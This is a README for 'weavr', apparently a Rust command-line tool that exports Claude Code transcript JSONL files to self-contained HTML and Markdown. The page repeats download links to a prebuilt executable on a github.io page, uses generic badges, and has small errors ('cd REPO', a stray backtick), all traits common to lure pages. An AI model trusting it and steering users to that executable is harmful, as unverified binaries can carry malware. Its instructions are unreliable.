# weavr v2026 - CLI transcript exporter 2026

> **weavr is a Rust-powered CLI that converts Claude Code transcript JSONL files into clean HTML and Markdown, keeping output local, portable, and aligned with the current 2026 release line.**

[![Platform](https://img.shields.io/badge/Platform-Rust-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/mooreowen2006/weavr-rust-cli-exporter?style=flat-square)](https://github.com/mooreowen2006/weavr-rust-cli-exporter)

---

<p align="center">
  <a href="https://mooreowen2006.github.io/weavr-rust-cli-exporter/">
    <img src="https://img.shields.io/badge/Download-weavr%20Latest-brightgreen?style=for-the-badge" alt="Download weavr">
  </a>
</p>

> **[Direct Download - weavr v2026](https://mooreowen2006.github.io/weavr-rust-cli-exporter/)**

---

[Download Latest Build](https://mooreowen2006.github.io/weavr-rust-cli-exporter/)

---

## What weavr does

weavr takes Claude Code transcript JSONL files and renders them into easier-to-read HTML and Markdown exports. It is built for local command-line use, so it drops into scripts, project directories, and repeatable workflows without requiring a larger application environment.

The exported HTML is fully self-contained. Fonts, CSS, and JavaScript are embedded in the result, which makes the output convenient for offline browsing, long-term archiving, project documentation, and searchable transcript review.

---

## Key capabilities

- Transforms Claude Code transcript JSONL files into HTML and Markdown
- Generates standalone HTML with embedded fonts, CSS, and JavaScript
- Handles batch exports across multiple projects with a central index
- Uses a SQLite cache to support incremental rebuilds
- Provides Markdown export with several detail levels and a compact option
- Includes theme switching, filter chips, and in-page search
- Records token usage in exported views
- Supports self-update workflows

---

## Installation

Build from source with standard Rust tooling:

- `git clone https://github.com/mooreowen2006/weavr-rust-cli-exporter.git
- `cd REPO`
- `cargo build --release`

Once compiled, run the CLI in the folder that contains your transcripts or point it directly at the JSONL files you want to export.

If you want a packaged release instead, use the download link above and run the executable in your local environment.

---

## How to use it

Export one transcript file:

- `weavr export path/to/transcript.jsonl`

Create HTML and Markdown output for an entire project folder:

- `weavr export path/to/project/`

Run a batch export over several projects:

- `weavr batch path/to/workspace/`

Typical workflow:
1. Gather the Claude Code transcript JSONL files.
2. Decide whether you want HTML, Markdown, or both.
3. Run the exporter on the file, folder, or workspace.
4. Open the generated result in your browser or editor.

---

## Configuration

weavr is intended for local use and keeps its working state close to the export process. SQLite stores cache data so incremental rebuilds can complete faster, while export behavior can be controlled through CLI flags or project-level settings where available.

Example pattern:

- cache: local SQLite file
- output: project directory or chosen export path
- mode: HTML, Markdown, or batch

If you need different output detail, compact formatting, or search behavior, tune the available command options before exporting.

---

## Requirements

- Rust runtime/tooling for building from source
- A local environment capable of reading and writing transcript files
- SQLite support for cached incremental rebuilds
- Enough disk space for HTML, Markdown, and batch exports

---

## FAQ

**How do I update weavr?**  
Use the built-in self-update flow if your build provides it, or swap your local binary for a newer release.

**Where are settings stored?**  
Configuration stays local, with cache data managed through SQLite and export destinations selected per run or per project.

**Can I export more than one project?**  
Yes. Batch export is supported and can produce a master index for grouped transcript output.

**Why is the HTML self-contained?**  
The export bundles its own fonts, styles, and scripts so it can be opened locally without outside dependencies.

**What if a transcript is not rendering as expected?**  
Confirm that the input is a valid Claude Code transcript JSONL file, then rerun the export using the mode or detail level that fits your needs.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
